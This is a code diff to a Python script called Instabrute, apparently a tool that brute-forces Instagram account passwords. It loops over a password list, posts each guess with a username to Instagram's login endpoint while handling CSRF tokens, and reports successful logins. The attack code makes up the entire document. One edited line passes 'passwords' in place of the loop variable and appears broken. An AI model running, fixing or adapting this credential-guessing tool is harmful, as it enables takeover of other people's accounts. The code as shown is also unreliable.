@@ -111,11 +111,11 @@ class Instabrute():
 
 		#Update token after enter to the site
 		r = sess.get('https://www.instagram.com/') 
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['X-CSRFToken']})
+		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['CSRFToken']})
 
 		#Update token after login to the site 
 		r = sess.post('https://www.instagram.com/accounts/login/ajax/', data={'username':self.username, 'password':password}, allow_redirects=True)
-		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['X-CSRFToken']})
+		sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['CSRFToken']})
 		
 		#parse response
 		data = json.loads(r.text)
@@ -151,7 +151,7 @@ print ('')
 
 
 for password in instabrute.passwords:
-	sess = instabrute.Login(password)
+	sess = instabrute.Login(passwords)
 	if sess:
 		print ('[*] Login success %s' % [instabrute.username,password])
 	else:
